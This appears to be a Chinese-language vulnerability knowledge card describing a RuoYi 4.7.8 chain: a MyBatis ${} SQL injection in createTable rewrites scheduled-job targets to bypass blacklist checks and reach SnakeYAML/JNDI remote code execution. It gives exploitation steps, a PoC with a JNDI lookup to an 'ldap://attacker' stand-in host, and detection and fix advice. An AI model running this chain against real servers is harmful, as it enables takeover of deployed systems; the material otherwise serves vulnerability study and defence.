---
id: web-java-rce-ruoyi-478-createtable-sqli-job-invoketarget-bypass
title: RuoYi 4.7.8 计划任务白名单绕过：GenTableServiceImpl.createTable 的 MyBatis ${} SQL 注入改写 sys_job.invoke_target 后触发 RCE
type: scenario
domain: web
path: web/java/rce
technique: ruoyi-478-createtable-sqli-job-invoketarget-bypass
aliases:
- RuoYi 4.7.8 RCE
- RuoYi createTable SQL 注入
- GenTableServiceImpl.createTable
- genTableMapper createTable
- sys_job invoke_target 修改
- 定时任务黑名单绕过
- 计划任务白名单绕过
tags:
- java
- ruoyi
- quartz
- sqli
- mybatis
- rce
- invoke-target
- blacklist-bypass
- whitelist-bypass
- code-audit
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: 4.7.8（原文分析版本；原文未给出完整影响区间）
verification:
  verified_by: verifier-V381
  verified_at: '2026-11-09T08:09:07+08:00'
  notes: 已对照原文与8张图核对：addSave 协议/危险类黑名单+com.ruoyi白名单、JobInvokeUtil 反射约束、GenTableServiceImpl#createTable 调 GenTableMapper.xml 、用 UPDATE sys_job.invoke_target 绕过校验后触发 SnakeYAML/JNDI 链，均与原文一致；affected_versions 保留原文分析版本 4.7.8（原文未给完整区间）；PoC 为归纳示意未复现；与既有 RuoYi <=4.6.2 直接 invokeTarget 反射 RCE 卡为不同版本与绕过链
---

## 一句话结论

RuoYi 4.7.8 在新增/编辑定时任务时用协议黑名单、危险类黑名单和 `com.ruoyi` 包白名单校验 `invokeTarget`，但白名单内的 `com.ruoyi.generator.service.impl.GenTableServiceImpl#createTable(String sql)` 被定时任务反射调用时会把参数直接拼进 MyBatis 的 `${sql}` 执行任意 SQL；攻击者先用它 `UPDATE sys_job SET invoke_target=...` 把黑名单中的 RCE 调用目标直接写进数据库（绕过 addSave 的全部检查），再触发该任务，`JobInvokeUtil` 从数据库读出未再校验的 `invoke_target` 执行 SnakeYAML/JNDI 链，形成「管理员权限 → RCE」的完整利用链。

## 原理

- **两道校验都在写入入口**：`SysJobController.addSave` 依次检查 cron 合法性、`rmi:`/`ldap:`/`ldaps:`/`http://`/`https://` 协议、`JOB_ERROR_STR`（`java.net.URL`、`javax.naming.InitialContext`、`org.yaml.snakeyaml`、`org.springframework`、`org.apache`、`com.ruoyi.common.utils.file`、`com.ruoyi.common.config`）以及 `ScheduleUtils.whiteList`（只允许 `com.ruoyi` 前缀）。校验通过后才 `jobService.insertJob`。也就是说黑/白名单只约束「通过该接口新增/编辑的 invokeTarget」。
- **执行侧不再校验**：`JobInvokeUtil.invokeMethod(SysJob)` 从 `sysJob.getInvokeTarget()` 取字符串，解析出类名/方法名/参数；类不在 Spring 容器时 `Class.forName(beanName).getDeclaredConstructor().newInstance()` 实例化并 `getMethod(...).invoke(...)`。只要类有无参构造、方法是 public、参数类型属于 String/Boolean/Long/Double/Integer，就能被调用；执行时不会重新检查黑/白名单。
- **白名单内的 SQL 执行 gadget**：`GenTableServiceImpl.createTable(String sql)` 直接调用 `genTableMapper.createTable(sql)`，对应 `GenTableMapper.xml` 中 `<update id="createTable">${sql}</update>`——`${}` 是字符串拼接而非 `#{}` 预编译，等价于任意 SQL 执行。该类位于 `com.ruoyi.generator.service.impl`，满足 `com.ruoyi` 白名单且不在 `com.ruoyi.common.config`/`common.utils.file` 排除项中。
- **绕过思路**：通过定时任务调用 `genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = <payload> WHERE job_id = <id>')`，把原本会被 addSave 拒绝的危险 `invoke_target`（如 `org.yaml.snakeyaml.Yaml.load(...)` 或 JNDI `InitialContext.lookup`）直接写进 `sys_job` 表；再通过 `/monitor/job/run` 或等待 cron 触发，Quartz 从数据库读取该记录并交给 `JobInvokeUtil` 反射执行。
- **为什么成立**：校验与执行使用了不同的数据来源——校验看 HTTP 请求参数，执行看数据库行；任何能写 `sys_job` 的路径都绕过了校验。SQL 注入恰好提供了这条写路径，而白名单又放行了这个 SQL 执行类，两个设计缺陷叠加。
- **辅助发现**：用 CodeQL 按「public + 无参构造 + String 参数 + com.ruoyi 包」枚举可被任务调度器调用的方法，能快速找到 `createTable`、`HttpUtils.sendGet` 等候选；后者是白名单内的无回显 SSRF（http/https 被禁，但 `ftp:`/`file:`/`jar:` 可用，原文用 `ftp://dnslog` 验证），危害低于 createTable。
- **影响**：攻击者需先拥有定时任务管理权限（默认 admin 或被授予 `monitor:job:*` 的角色）；利用后以应用进程身份执行命令，从「后台管理员」升级为「服务器 RCE」。原文称实测 SnakeYAML 与 JNDI 注入→反序列化均可打通，具体 RCE payload 参见公开 POC/黑名单 bypass 文章。

## 触发条件

- 目标为 RuoYi 4.7.8（原文分析版本；更高版本是否同样存在该白名单组合需按代码确认）。
- 攻击者拥有定时任务新增/运行权限（`monitor:job:add`、`monitor:job:run`）。
- 目标数据库为 MySQL 等支持 `UPDATE` 的数据库，`sys_job` 表存在可被触发的任务记录（job_id 已知或可枚举）。
- 目标 classpath 中存在可用的 RCE 链（SnakeYAML 或 JNDI 可用类），且 JVM 能访问攻击者资源。

## 利用步骤

1. 以管理员登录，进入「系统监控 → 定时任务」，确认可新增/运行任务，记录一个可触发的 `job_id`（如 1）。
2. 新增一个「合法」任务，`invokeTarget` 使用白名单内 SQL gadget：
   `genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = <危险类调用字符串> WHERE job_id = 1')`
   （方法名与参数需符合 `JobInvokeUtil` 的解析规则；Bean 名也可用全限定类名调用）。
3. 立即运行该任务，让 SQL 注入执行，把黑名单中的 `invoke_target`（如 `org.yaml.snakeyaml.Yaml.load('...')` 或 `javax.naming.InitialContext.lookup('ldap://...')`）写入 `sys_job`。
4. 再次运行 `job_id=1`（或等待 cron），Quartz 从数据库读出被篡改的记录，`JobInvokeUtil` 反射执行危险类方法，触发 SnakeYAML/JNDI 链 RCE。
5. 验证命令执行/回连；清理新增任务与数据库改动。

## PoC

```text
# 1) 新增任务，invokeTarget 走白名单内 SQL 执行类
invokeTarget = genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6f72672e79616d6c2e736e616b6579616d6c2e59616d6c2e6c6f6164... WHERE job_id = 1')
cronExpression = 0/10 * * * * ?

# 2) 运行任务，触发 SQL 注入写入危险 invoke_target
POST /monitor/job/run  jobId=1

# 3) 再次运行 job_id=1，Quartz 执行被篡改的 invoke_target
#    （危险调用字符串示例：org.yaml.snakeyaml.Yaml.load('!!...') 或 javax.naming.InitialContext.lookup('ldap://attacker/exp')）
```

原文通过 `createTable` 直接执行 `UPDATE sys_job ...` 的 SQL，并说明实测 SnakeYAML/JNDI 链可 RCE；完整 payload 见公开 POC。本卡未复现。

## 变体与关联

- **白名单内其它 gadget**：`com.ruoyi.common.utils.http.HttpUtils#sendGet` 是白名单内的无回显 SSRF（http/https 被黑名单禁用，可尝试 `ftp:`/`file:`/`jar:` 协议，原文用 ftp dnslog 验证）；危害与可利用性低于 createTable。
- **直接调用黑名单类**：4.7.2 之前的版本无类白名单，可直接 `org.yaml.snakeyaml.Yaml.load(...)`（已有 RuoYi invokeTarget 反射 RCE 卡）。
- **其它写库路径**：任何能修改 `sys_job.invoke_target` 的 SQL 注入/越权接口都可替代 createTable，本质是校验数据源与执行数据源不一致。
- **修复方向**：在 `JobInvokeUtil` 执行侧做类/方法白名单，而不是只在 addSave 校验；`createTable` 改为白名单 DDL 或移除；MyBatis 使用 `#{}` 参数化。

## 检测与防御

- **执行侧强校验**：在 `JobInvokeUtil.invokeMethod` 内对类名/方法名/包名做白名单（只允许任务调度专用类），并在加载类前后都校验；不要信任数据库中的 `invoke_target`。
- **SQL 修复**：`GenTableMapper.xml` 的 `createTable` 不应使用 `${sql}` 直接拼接；改为预定义 DDL 模板与参数化，或删除该反射可调用方法。
- **权限与审计**：限制定时任务管理权限，审计 `sys_job` 表的异常 UPDATE 与 `createTable` 调用；监控 `invoke_target` 包含 `org.yaml`、`InitialContext`、`ldap:` 等关键字的记录。
- **WAF/日志**：关注 `invokeTarget` 参数中出现 SQL 关键字（UPDATE/INSERT/SELECT）与危险类名；告警 `/monitor/job/run` 的异常触发频率。
